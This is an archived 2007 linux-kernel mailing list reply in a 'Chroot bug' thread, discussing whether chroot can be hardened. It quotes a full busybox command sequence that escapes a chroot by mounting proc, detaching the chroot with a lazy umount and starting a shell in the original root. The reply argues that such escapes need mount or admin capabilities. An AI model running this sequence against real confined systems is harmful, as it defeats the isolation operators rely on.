Return-Path: <linux-kernel-owner+w=401wt.eu-S1759989AbXIZPBo@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1759989AbXIZPBo (ORCPT <rfc822;w@1wt.eu>);
	Wed, 26 Sep 2007 11:01:44 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1755045AbXIZPBg
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 26 Sep 2007 11:01:36 -0400
Received: from h90-m1.hosting90.cz ([81.0.225.70]:53744 "EHLO
	h90-m1.hosting90.cz" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1754747AbXIZPBf (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Wed, 26 Sep 2007 11:01:35 -0400
Message-ID: <46FA7450.5020707@prepere.com>
Date: Wed, 26 Sep 2007 17:01:36 +0200
From: Miloslav Semler <majkls@prepere.com>
User-Agent: IceDove 1.5.0.12 (X11/20070607)
MIME-Version: 1.0
To: Kyle Moffett <mrmacman_g4@mac.com>
CC: David Newall <david@davidnewall.com>, Adrian Bunk <bunk@kernel.org>,
       Alan Cox <alan@lxorguk.ukuu.org.uk>,
       "Serge E. Hallyn" <serge@hallyn.com>, Bill Davidsen <davidsen@tmr.com>,
       Philipp Marek <philipp@marek.priv.at>, 7eggert@gmx.de, bunk@fs.tum.de,
       linux-kernel@vger.kernel.org
Subject: Re: Chroot bug
References: <46F83474.5040503@davidnewall.com> <20070924230008.GA3160@vino.hallyn.com> <46F8BC8A.7080006@davidnewall.com> <20070925114947.GA9721@vino.hallyn.com> <46F91417.9050600@davidnewall.com> <46F924E3.50205@davidnewall.com> <20070925163040.12a3c2f8@the-village.bc.nu> <46F92AAB.1060903@davidnewall.com> <20070925164806.4cadc6a5@the-village.bc.nu> <46F99EDE.70905@davidnewall.com> <20070926005551.GS6800@stusta.de> <F23AFB4D-E989-4F06-A256-4D12D852DFA2@mac.com> <46FA341A.80706@davidnewall.com> <6BA6E9EE-B67B-4334-AC83-9B8E30527832@mac.com> <46FA5A85.20407@prepere.com> <73A0FA2C-7202-4E5C-9521-C2BC7026DE3B@mac.com>
In-Reply-To: <73A0FA2C-7202-4E5C-9521-C2BC7026DE3B@mac.com>
Content-Type: text/plain; charset=ISO-8859-1; format=flowed
Content-Transfer-Encoding: 7bit
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


>
> This is basically both painfully racy and easily broken with umount 
> and/or access to proc.  See this busybox-compatible example:
>
> ## Set up chroot
> mkdir /root1
> mount -o mode=0750 -t tmpfs tmpfs /root1
> cp -a /bin/busybox /root1/busybox
>
> ## Enter chroot
> chroot /root1 /busybox
>
> ## Mount proc
> /busybox mkdir /proc
> /busybox mount -t proc proc /proc
>
> ## Poke around root filesystem (this may be all you need)
> /busybox ls /proc/1/root/
>
> ## Detach our chroot so we're no longer a sub-directory
> /busybox umount -l /proc/1/root/root1
>
> ## Now we can easily chroot to the original root, since it isn't in 
> our ".." path
> exec /busybox chroot /proc/1/root /bin/sh
>
>
> See how easy that is?  Unless you stick the above parent-directory 
> check (which is still racy against directories being moved around) for 
> *EVERY* directory component of *EVERY* open/chdir-ish syscall, you are 
> still going to be easily worked around through many different methods.
>
so there is no discussion about mount & others. I think, if you have 
CAP_SYS_MOUNT/CAP_SYS_ADMIN, you need not solve chroot() and how to 
break it.
